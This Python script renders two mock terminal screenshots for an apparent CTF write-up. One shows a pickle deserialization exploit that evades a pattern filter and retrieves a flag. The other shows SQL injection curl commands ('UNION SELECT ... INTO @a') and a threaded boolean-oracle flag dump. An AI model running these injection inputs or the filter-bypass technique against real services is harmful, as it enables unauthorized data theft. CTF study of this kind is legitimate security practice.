import os
from PIL import Image, ImageDraw, ImageFont

def render_terminal(title, lines, out_path):
    font_size = 18
    font = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", font_size)
    bold_font = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", font_size)
    header_font = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 15)

    line_height = 26
    padding_x = 24
    padding_y = 20
    header_height = 42

    width = 960
    height = header_height + padding_y * 2 + len(lines) * line_height

    img = Image.new("RGBA", (width, height), (18, 20, 26, 255))
    draw = ImageDraw.Draw(img)

    # Header bar
    draw.rectangle([(0, 0), (width, header_height)], fill=(28, 32, 42, 255))
    # Window controls (macOS style dots)
    draw.ellipse([(16, 15), (28, 27)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 15), (48, 27)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 15), (68, 27)], fill=(39, 201, 63, 255))

    # Title
    draw.text((width // 2 - len(title) * 4, 13), title, fill=(160, 170, 190, 255), font=header_font)

    # Content
    y = header_height + padding_y
    for text, color, is_bold in lines:
        f = bold_font if is_bold else font
        draw.text((padding_x, y), text, fill=color, font=f)
        y += line_height

    img.save(out_path)
    print(f"Saved: {out_path}")

# 1. Pickle terminal
pickle_lines = [
    ("$ python exploit_remote.py", (255, 255, 255, 255), True),
    ("[*] Bypassing restrictions:", (100, 200, 255, 255), False),
    ("    [-] Banned patterns (., os, eval, flag) -> Escaped in opcode S", (180, 190, 205, 255), False),
    ("    [-] Opcode REDUCE & STOP (.) -> Omitted to trigger EOF & bypass filter", (180, 190, 205, 255), False),
    ("    [-] Execution chain -> Capsule -> BUILD(__builtins__) -> render(eval) -> OBJ", (180, 190, 205, 255), False),
    ("", (255, 255, 255, 255), False),
    ("[*] Generated Base64 Payload:", (100, 200, 255, 255), False),
    ("    KGlzZXNzaW9uc3RvcmUKQ2Fwc3VsZQooUydjYWNoZScKY3Nlc3Npb25zdG9yZQ...", (140, 150, 170, 255), False),
    ("", (255, 255, 255, 255), False),
    ("[*] Sending POST /restore to https://d49ae0d8011d60aa.chal.ctf.ae ...", (255, 220, 100, 255), False),
    ("", (255, 255, 255, 255), False),
    ("[+] Server Response (200 OK):", (80, 240, 120, 255), True),
    ('    {"disassembled":"Error!","ok":true,"output":"pwnsec{ce3a3177fb14adae}\\n\\n"}', (80, 240, 120, 255), False),
    ("", (255, 255, 255, 255), False),
    ("[+] FLAG EXTRACTED: pwnsec{ce3a3177fb14adae}", (39, 201, 63, 255), True),
]

render_terminal("bash - CTF Terminal - pickle exploit", pickle_lines, "c:/Users/ACER/Downloads/ctf/ctf pwnsec/images/pickle_terminal.png")
render_terminal("bash - CTF Terminal - pickle exploit", pickle_lines, "C:/Users/ACER/.gemini/antigravity-ide/brain/cf6eca68-4479-4674-b4a1-03b3a2748534/pickle_terminal.png")

# 2. Phault terminal
phault_lines = [
    ("$ # Step 1: Testing INTO @var Oracle", (160, 170, 190, 255), False),
    ('$ curl -s "https://[HOST]/?id=1 UNION SELECT 2 INTO @a" | tail -n 1', (255, 255, 255, 255), True),
    ("ill try to tell him, dw  # 2 rows -> Error 1172 -> die() [Clean Exit]", (80, 200, 255, 255), False),
    ("", (255, 255, 255, 255), False),
    ('$ curl -s "https://[HOST]/?id=1 UNION SELECT 2 WHERE 1=2 INTO @a" | tail -n 3', (255, 255, 255, 255), True),
    ("Fatal error: Uncaught Error: Call to a member function fetch_row() on bool", (255, 95, 86, 255), True),
    ("  thrown in /var/www/html/index.php on line 19", (255, 120, 110, 255), False),
    ("", (255, 255, 255, 255), False),
    ("$ # Step 2: Multi-threaded Flag Dump via Boolean Oracle", (160, 170, 190, 255), False),
    ("$ python solve_flag.py", (255, 255, 255, 255), True),
    ("[*] Checking tables: found 'flag' table with column 'flag'", (100, 200, 255, 255), False),
    ("[*] Measuring flag length: (SELECT LENGTH(flag) FROM flag) = 24", (100, 200, 255, 255), False),
    ("[*] Spawning 16 concurrent worker threads...", (255, 220, 100, 255), False),
    ("[+] Pos 8..23 dumped: 0, e, 2, d, e, 7, 7, 0, 6, 0, a, 0, 5, e, 9, 1", (80, 240, 120, 255), False),
    ("", (255, 255, 255, 255), False),
    ("[+] FLAG VERIFIED: pwnsec{0e2de77060a05e91}", (39, 201, 63, 255), True),
]

render_terminal("bash - CTF Terminal - PHAULT Oracle Exploit", phault_lines, "c:/Users/ACER/Downloads/ctf/ctf pwnsec/images/phault_terminal.png")
render_terminal("bash - CTF Terminal - PHAULT Oracle Exploit", phault_lines, "C:/Users/ACER/.gemini/antigravity-ide/brain/cf6eca68-4479-4674-b4a1-03b3a2748534/phault_terminal.png")
